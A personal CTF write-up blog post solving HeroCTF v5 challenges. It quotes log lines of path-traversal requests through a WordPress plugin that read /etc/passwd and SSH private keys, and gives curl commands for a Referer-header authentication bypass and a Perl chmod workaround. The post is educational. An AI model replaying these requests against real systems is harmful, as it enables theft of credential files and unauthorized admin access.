---
title: "HeroCTF V5"
date: 2023-05-15T12:13:32+05:30
description: "Some web and system solves using a wide array of interesting catches and snags."
tags: [python, pwn, web, system, forensics]
---

## Overview

HeroCTF was my first solo team attempt at CTF'ing. It was a blast and huge props to the authors of the challenges. I had fun solving all the ones I did and had plenty of time to experiment with the ones I couldn't. The CTF was hosted here: [link](https://ctf.heroctf.fr/). I'll break down my solves below in no particular order.

## dev.corp 1/4

```txt
The famous company dev.corp was hack last week.. They don't understand because they have followed the security standards to avoid this kind of situation. You are mandated to help them understand the attack.

For this first step, you're given the logs of the webserver of the company.

Could you find :
- The CVE used by the attacker ?
- What is the absolute path of the most sensitive file recovered by the attacker ?

Format : Hero{CVE-XXXX-XXXX:/etc/passwd}
Author : Worty
Category : Foresnsics

access.log
```

I started by looking for something vulnerability like; I saw these lines stand out as the ../ is typically used for unintended file traversal.

```t
internalproxy.devcorp.local - - [02/May/2023:13:13:17 +0000] "GET //wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../home/webuser/.ssh/id_rsa_backup HTTP/1.1" 200 2963 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"

internalproxy.devcorp.local - - [02/May/2023:13:12:46 +0000] "GET //wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../home/webuser/.ssh/id_rsa HTTP/1.1" 500 354 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"

internalproxy.devcorp.local - - [02/May/2023:13:13:03 +0000] "GET //wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../home/webuser/.ssh/config HTTP/1.1" 200 531 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"

internalproxy.devcorp.local - - [02/May/2023:13:12:29 +0000] "GET //wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../../etc/passwd HTTP/1.1" 200 2240 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
```

From here, I took the suspicious `//wp-admin/admin-ajax.php?action=duplicator_download&` and did a lookup in Google on that string. I stumbled across [WordPress's website](https://wpscan.com/vulnerability/10078) with the exact vulnerability I was looking for.

Flag: Hero{CVE-2020-11738:../../../../../../../../../home/webuser/.ssh/id_rsa_backup}

## OpenPirate

```txt
OpenPirate
484
easy dns
A pirate runs a website that sells counterfeit goods, it is available under the name heroctf.pirate. However, we can't get our hands on it, can you help us? Your goal is to find a way to access this website.

Format : Hero{flag}
Author : xanhacks
Category : OSINT
```

So we have a domain, let's plug it into Google. No dice, just a regular Google search. Let's check with a DNS Lookup... no dice there either.

I headed off to look up the `.pirate` Top Level Domain (TLD), I stumbled across [this article](https://torrentfreak.com/pirate-domains-now-available-through-opennic-120515/) that pointed me to the OpenNIC platform which is advertised as an open and democratic alternative DNS root.

I hit find out more and am lead to the documentation for the project where they provide a [web proxy](http://proxy.opennic.org/) for connecting to these sites. I used this proxy to plug in our `heroctf.pirate` and the flag started scrolling across the screen.

Flag: Hero{OpenNIC_is_free!!!3586105739}

## dev.corp pt2

158.49.62.15 or 109.0.0.0???

## Best Schools

```txt
Best Schools
50
easy
An anonymous company has decided to publish a ranking of the best schools, and it is based on the number of clicks on a button! Make sure you get the 'Flag CyberSecurity School' in first place and you'll get your reward!

> Deploy on deploy.heroctf.fr

Format : Hero{flag}
Author : Worty
Category : Web
```

We can see there is a GraphQL backend, this seems like we might be able to use to do more than one update at a time. We can print the schema of the DB with this cURL command but we see there are only two functions. The query one doesn't update information and `increaseClickSchool` only takes in the school name as a string.

```bash
tylerzars@Tylers-16-MBP ~ % curl 'http://dyn-03.heroctf.fr:13391/graphql' \
  -H 'Accept: application/json' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://dyn-03.heroctf.fr:13391' \
  -H 'Referer: http://dyn-03.heroctf.fr:13391/' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  --data-raw '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}' \
  --compressed \
  --insecure

{"data":{"__schema":{"queryType":{"fields":[{"name":"getNbClickSchool"}]},"mutationType":{"fields":[{"name":"increaseClickSchool"}]}}}}
```

The GraphQL backend is what is limiting our inputs by throwing a 429 Too Many Requests.

I wasn't able to solve this during the event, but I read afterwards that to bypass the GraphQL limit, you can add multiple queries together in a single request.

## Referrrrer

```txt
Referrrrer
50
easy
Defeated the security of the website which implements authentication based on the Referer header.

URL : http://static-01.heroctf.fr:7000
Format : Hero{flag}
Author : xanhacks
Category : web

Referrrrer.zip
```

Upon loading the page, we get greeted with a "Hello World". I missed the source at first look, but there is source code provided for the challenge to recreate the Docker enviroment. The `index.js` file hosts an ExpressJS app, some middleware, that serves an `/admin` route assuming we get the header referer correct.

```js
app.get("/admin", (req, res) => {
    if (req.header("referer") === "YOU_SHOUD_NOT_PASS!") {
        return res.send(process.env.FLAG);
    }

    res.send("Wrong header!");
})
```

I used cURL to build my requests so I had modular control over each of the pieces of my request. I could get my exploit working locally just on the `index.js` file using node to run it. However, this didn't work remotely... I asked the admins before I sunk anymore time down the whole and they said there was more to the project then the app directory. Whoops, I skipped right over the `nginx.conf` file that controls the host. This configuration file contains another thing that checks the Referer field.... of course that's a drag.

```conf
location /admin {
            if ($http_referer !~* "^https://admin\.internal\.com") {
                return 403;
            }

            proxy_pass http://express_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
```

This check will make sure the referer is from `https://admin.internal.com` while our ExpressJS route requires our referer to be `YOU_SHOUD_NOT_PASS!`. Welp, how do I pass both through? Reading the ExpressJS backend code, you can see that they state the following:

```js
export interface Request<
    P = ParamsDictionary,
    ResBody = any,
    ReqBody = any,
    ReqQuery = ParsedQs,
    LocalsObj extends Record<string, any> = Record<string, any>
> extends http.IncomingMessage,
        Express.Request {
    /**
     * Return request header.
     *
     * The `Referrer` header field is special-cased,
     * both `Referrer` and `Referer` are interchangeable.
     *
     * ...
     */
```

Essentially, we can have the field say either referer with one or two r's in it. That's our in, I formatted my cURL command to the following and presto!

```bash
curl -H 'Referer: https://admin.internal.com' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'If-None-Match: W/"c-Lve95gjOVATpfV8EL5X4nxwjKHE"' \
  -H 'Upgrade-Insecure-Requests: 0' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  --compressed \
  --insecure \
  -H 'Referrer: YOU_SHOUD_NOT_PASS!' -v  'http://static-01.heroctf.fr:7000/admin'
```

If you used Referrer for the Express part, the server would pass that along and it wouldn't get swallowed up by the nginx check. Using Referer for the nginx part passed the first check and our funny spelling would pass right along.

Flag: Hero{ba7b97ae00a760b44cc8c761e6d4535b}

## chm0d

```txt
Chm0d
50
easy system
Catch-22: a problematic situation for which the only solution is denied by a circumstance inherent in the problem.

Credentials: user:password123

> Deploy on deploy.heroctf.fr

Format : Hero{flag}
Author : Alol
Category : system
```

We are provided with ssh credentials into a server, we can check that we aren't root with `umask` and the fact we aren't able to open `/etc/shadow`. Heading to the root directory after seeing everything else is blank, we see our `flag.txt` file but sadly `cat flag.txt` throws an error.

```bash
user@9d2ef3c824729f2bd2e171e863fddc3e:/$ cat flag.txt
cat: flag.txt: Permission denied
```

Alright, we don't have permissions but we can just use `chmod 777 flag.txt` to give everyone read write execute on this file. D R A T S, that just throws another error that we can't run it.

```bash
user@9d2ef3c824729f2bd2e171e863fddc3e:/$ chmod 777 flag.txt
-bash: /bin/chmod: Permission denied
```

So I ran down the rabbit-hole to find out more about how to make this work. I thought of `chown` first, but `chown` is for changing owners and not modifying permissions. I headed to the vast internet and stumbled upon these two articles I figured I would give a shot at [link1](https://troysunix.blogspot.com/2010/10/fix-broken-chmod-or-how-to-chmod-chmod.html) and [link2](https://unix.stackexchange.com/a/83864). No dice with the first article but StackOverflow is clutch, we can use this Perl one-liner to actually execute chmod as a function rather than as a binary executable. Of course it threw an error though:

```bash
user@9d2ef3c824729f2bd2e171e863fddc3e:~$ perl -e 'chmod 0755, "/bin/chmod"' 
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = "en_US.UTF-8",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
```

So, this isn't something bad but I just needed to set an variable in my terminal session to have Perl use the correct settings. This command is: `export LC_ALL=C.UTF-8`. Since our Perl one-liner now executes, can successfully take control of `flag.txt` and then use `cat` to read the contents.

Flag: Hero{chmod_1337_would_have_been_easier}
